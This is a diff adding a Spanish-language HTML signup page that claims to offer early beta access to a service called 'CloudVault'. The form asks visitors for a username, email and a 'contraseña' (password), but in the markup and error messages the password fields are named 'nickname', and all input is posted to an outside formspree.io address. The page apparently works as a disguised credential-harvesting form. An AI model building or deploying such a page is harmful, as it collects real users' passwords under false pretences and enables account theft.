@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Únete a la Beta de CloudVault</title>
+
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial;
+      background: #0f172a;
+      color: white;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .form-container {
+      background: rgba(255,255,255,0.1);
+      padding: 30px;
+      border-radius: 12px;
+      width: 350px;
+    }
+
+    h2 {
+      text-align: center;
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 6px;
+    }
+
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #22c55e;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background: #16a34a;
+    }
+
+    .error {
+      color: #ff6b6b;
+      font-size: 12px;
+      margin-top: 5px;
+      text-align: center;
+    }
+  </style>
+</head>
+
+<body>
+
+<div class="form-container">
+  <h2>Obtén acceso anticipado</h2>
+
+  <form action="https://formspree.io/f/xrewlybl" method="post">
+
+    <input type="text" name="name" id="name" placeholder="nombre de usuario" required>
+
+    <input type="email" name="email" id="email" placeholder="Correo electrónico" required>
+
+    <input type="text" name="nickname" id="text" placeholder="contraseña" required>
+
+    <input type="text" name="confirm_nickname" id="confirmText" placeholder="confirmar Contraseña" required>
+
+    <div class="error" id="error"></div>
+
+    <button type="submit">Enviar solicitud</button>
+  </form>
+</div>
+
+<script>
+  const form = document.querySelector("form");
+  const error = document.getElementById("error");
+
+  function isValidNickname(value) {
+    return /^[a-zA-Z0-9]+$/.test(value);
+  }
+
+  form.addEventListener("submit", function(e) {
+    const nickname = document.getElementById("text").value;
+    const confirmNickname = document.getElementById("confirmText").value;
+
+    if (!isValidNickname(nickname) || !isValidNickname(confirmNickname)) {
+      e.preventDefault();
+      error.textContent = "El apodo solo puede contener letras y números";
+      return;
+    }
+
+    if (nickname !== confirmNickname) {
+      e.preventDefault();
+      error.textContent = "Los apodos no coinciden";
+      return;
+    }
+
+    if (nickname.length < 3) {
+      e.preventDefault();
+      error.textContent = "El apodo debe tener al menos 3 caracteres";
+      return;
+    }
+  });
+</script>
+
+</body>
+</html>
